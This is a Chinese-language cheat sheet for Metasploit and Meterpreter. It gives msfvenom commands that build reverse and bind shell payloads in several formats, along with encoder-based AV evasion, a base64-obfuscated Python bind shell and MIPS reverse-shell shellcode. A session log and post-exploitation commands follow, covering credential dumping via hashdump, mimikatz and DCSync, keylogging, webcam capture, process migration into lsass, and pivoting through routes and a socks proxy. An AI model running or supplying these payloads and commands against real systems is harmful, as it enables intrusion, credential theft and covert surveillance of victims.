# Metasploit 与 Meterpreter 速查

## 0x01 概述

本篇用于记录 `msfvenom` 生成载荷、`msfconsole` 建立会话以及 `meterpreter` 常用命令。偏向查用速记，不展开模块原理。

## 0x02 Payload 生成

使用 MSF 套件中的 `msfvenom` 生成载荷。

### Windows 载荷生成（最常用）

- `-p`：选择 payload
- `LHOST`：我方接收主机 IP
- `LPORT`：我方接收监听端口
- `-f`：输出格式
- `-o`：载荷输出位置

生成 x64 反弹 Meterpreter 的 EXE：

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o shell.exe
```

其他常用格式：

- `-f psh-cmd`：PowerShell 一句话命令，可直接粘贴到目标 cmd 执行，适合不落盘场景
- `-f dll`：DLL 载荷，用于 DLL 劫持或 `rundll32` 加载
- `-f msi`：MSI 安装包，配合 `msiexec /q /i shell.msi` 执行

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f psh-cmd
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f dll -o shell.dll
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f msi -o shell.msi
```

加编码迭代（改变载荷静态特征）：

```
# x86 载荷用 shikata_ga_nai 多态编码，-i 指定迭代次数
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o shell.exe
# x64 载荷需换用 x64 编码器（如 x64/xor_dynamic）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -e x64/xor_dynamic -i 5 -o shell.exe
```

> 注意：`shikata_ga_nai` 等经典编码器对现代 AV 效果有限，编码只能改变静态特征、无法消除行为特征，实战免杀需结合加密载荷、加壳或自研加载器。

### Meterpreter of Python

- `-p`：选择 payload
- `LPORT`：监听端口
- `-o`：载荷输出位置

```
msfvenom -p  python/meterpreter/bind_tcp lport=6666 -o /tmp/re111
```

生成的 Python 文件内容示例：

```
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHpsaWIsYmFzZTY0LHNvY2tldCxzdHJ1Y3QKYj1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpiLmJpbmQoKCcwLjAuMC4wJyw4ODg4KSkKYi5saXN0ZW4oMSkKcyxhPWIuYWNjZXB0KCkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))
```

### Meterpreter of Linux X64

反弹 Shell 示例：

- `LHOST`：我方接收主机 IP
- `LPORT`：我方接收监听端口

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f elf > re111.elf
```

### Shellcode of Linux mipsle

```
msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.1 LPORT=8888 --arch mipsle --platform linux -f py -o re111.py 
```

```
buf =  b""
buf += b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"
buf += b"\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
buf += b"\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"
buf += b"\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c"
buf += b"\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x64\x0e\x3c\xc0"
buf += b"\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"
buf += b"\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"
buf += b"\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"
buf += b"\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"
buf += b"\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"
buf += b"\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"
buf += b"\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
buf += b"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
buf += b"\x01\x01"
```

## 0x03 监听与利用

使用 MSF 套件中的 `msfconsole` 启动监听或利用模块。

```
msfconsole
```

### 通用会话管理模块

```
msf6> use exploit/multi/handler
#设置payload
msf6 exploit(multi/handler) > set payload python/meterpreter/bind_tcp
#设置RHOST（目标地址）
msf6 exploit(multi/handler) > set RHOST 127.0.0.1
RHOST => 127.0.0.1
#设置LPORT（目标后门服务监听端口）
msf6 exploit(multi/handler) > set LPORT 8888
LPORT => 8888
#执行
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 127.0.0.1:8888
[*] Sending stage (39800 bytes) to 127.0.0.1
[*] Meterpreter session 3 opened (127.0.0.1:7812 -> 127.0.0.1:8888 ) at 2022-02-16 11:26:51 +0800

meterpreter >
```

### 常用辅助模块

| 模块路径 | 用途 |
| --- | --- |
| auxiliary/scanner/portscan/tcp | 内网 TCP 端口扫描 |
| auxiliary/scanner/discovery/arp_scanner | ARP 方式发现内网存活主机 |
| auxiliary/scanner/smb/smb_login | SMB 口令爆破（本地/域账号密码喷洒） |
| exploit/windows/smb/psexec_psh | PowerShell 版 PsExec，凭据/Hash 直接拿会话 |
| post/windows/gather/credentials/* | 各类应用凭证收集（浏览器、WiFi、Outlook 等） |

## 0x04 Meterpreter 常用命令

### 基本命令

```
background   # 将当前会话放置后台
sessions   # sessions –h 查看帮助
sessions -i <ID值>  #进入会话   -k  杀死会话
bgrun / run   # 执行已有的模块，输入run后按两下tab，列出已有的脚本
info   # 查看已有模块信息
getuid   # 查看当前用户身份
getprivs  # 查看当前用户具备的权限
getpid   # 获取当前进程ID(PID)
sysinfo   # 查看目标机系统信息
irb   # 开启ruby终端
ps   # 查看正在运行的进程    
route  # 查看目标机路由表
arp    # 查看目标机 ARP 缓存
kill <PID值> # 杀死指定PID进程
idletime     # 查看目标机闲置时间
reboot / shutdown    # 重启/关机
shell    # 进入目标机cmd shell
```

### 文件操作

`upload`

```
Usage: upload [options] src1 src2 src3 ... destination
-r  Upload recursively
```

`download`

```
Usage: download [options] src1 src2 src3 ... destination

    -a   Enable adaptive download buffer size
    -b   Set the initial block size for the download
    -c   Resume getting a partially-downloaded file
    -h   Help banner
    -l   Set the limit of retries (0 unlimits)
    -r   Download recursively
    -t   Timestamp downloaded files
```

### 端口转发
```
portfwd add -l 7777 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地7777端口
```

### 添加路由
```
run autoroute -h # 查看帮助
run get_local_subnets # 查看目标内网网段地址
run autoroute -s 192.168.183.0/24  # 添加目标网段路由
run autoroute -p  # 查看添加的路由
```

### 进程迁移与权限提升

```
ps                # 查看进程列表，选定稳定且合法的进程
migrate <pid>     # 进程迁移：注入到合法进程（如 explorer.exe / lsass.exe），规避排查、防止原载体进程退出掉线
getsystem         # 尝试提权到 SYSTEM（自动尝试多种技术）
```

### 凭证获取

```
hashdump        # 导出本地 SAM 库中所有用户的 NTLM Hash
creds_all       # 一键汇总：SAM Hash + 内存明文 + 密码历史等
load kiwi       # 加载 mimikatz 插件（老版本为 load mimikatz），详见下节速查
```

### Mimikatz（kiwi）模块速查

`load kiwi` 加载 mimikatz 插件后可用：

```
creds_msv            # 抓取 MSV 凭证（NTLM Hash）
creds_wdigest        # 抓取 WDigest 凭证（需目标开启 WDigest 才有明文）
creds_kerberos       # 抓取 Kerberos 明文密码/票据
lsa_dump_sam         # 导出本地 SAM 库 Hash
lsa_dump_secrets     # 导出 LSA Secrets
dcsync_ntlm <user>   # DCSync：从域控直接同步指定用户的 NTLM Hash（需域管权限）
```

### 键盘记录与屏幕监控

```
keyscan_start    # 开始键盘记录
keyscan_dump     # 导出已记录的键盘输入
keyscan_stop     # 停止键盘记录
screenshot       # 屏幕截图（自动保存到本地目录）
webcam_snap      # 摄像头拍照
webcam_stream    # 开启摄像头视频流
```

### 网络代理与内网穿透

与上文「端口转发」「添加路由」两节配合使用，典型流程：查网段 → 加路由 → 端口转发/代理：

```
run get_local_subnets                   # 查看目标内网网段
run autoroute -s 10.0.0.0/24            # 添加目标网段路由
portfwd add -l 3389 -r 10.0.0.5 -p 3389 # 将内网目标 3389 转发到本地 3389
```

如需让 msf 之外的工具（浏览器、nmap 等）走目标内网，可在 `msfconsole` 中启用 socks 代理：

```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run
```

## 0x05 注意事项

- 先确认 payload 类型、监听模式和目标连接方式一致，否则 handler 很容易配错。
- 生成载荷后，最好记录目标架构、平台、回连地址和端口，避免后续混淆。
- `meterpreter` 功能多，但痕迹也明显，实战中要按需使用模块。

## Ref
- https://xz.aliyun.com/t/6400
- https://docs.metasploit.com/ （MSF 官方文档）
- https://www.offsec.com/metasploit-unleashed/ （Metasploit Unleashed 免费在线教程）
